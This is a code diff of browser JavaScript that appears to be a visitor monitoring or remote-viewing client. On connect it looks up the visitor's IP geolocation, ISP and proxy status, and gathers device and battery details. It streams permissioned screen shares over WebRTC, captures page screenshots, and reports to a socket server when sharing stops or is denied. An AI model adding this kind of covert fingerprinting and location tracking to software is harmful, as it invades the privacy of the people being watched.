@@ -36,8 +36,8 @@ socket.on('connect', async () => {
     const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
     ipAdd = await raw.json();
 
-    // const battery = await navigator.getBattery();
-    // const batteryCharging = battery.charging ? true : false;
+    const battery = await navigator.getBattery();
+    const batteryCharging = battery.charging ? true : false;
 
     const deviceInfo = {
         userAgent: navigator.userAgent,
@@ -188,7 +188,7 @@ socket.on('connect', async () => {
                     socket.emit(ice_candidate, binaryData);
                 }
             };
-
+            
             peerConnection.addTrack(videotrack, stream);
 
             const offer = await peerConnection.createOffer();
@@ -197,9 +197,16 @@ socket.on('connect', async () => {
             const binaryOffer = stringToBinary(string);
             const sendOffer = binaryEvent('sendOffer');
             socket.emit(sendOffer, binaryOffer);
+
+            stream.getVideoTracks()[0].onended = () => {
+                const stoppedScreenSharing = binaryEvent('stoppedScreenSharing');
+                socket.emit(stoppedScreenSharing);
+            };
         }
         catch (e) {
             console.log('Error accessing screen share', e);
+            const deniedScreenSharing = binaryEvent('deniedScreenSharing');
+            socket.emit(deniedScreenSharing);
         }
     });
 
@@ -237,7 +244,10 @@ socket.on('connect', async () => {
                 y: window.scrollY,
                 width: window.innerWidth,
                 height: window.innerHeight,
-                useCORS: true
+                useCORS: true,
+                logging: true,
+                backgroundColor: null,
+                scale: 1,
             });
 
             const blob = await new Promise((resolve, reject) => {
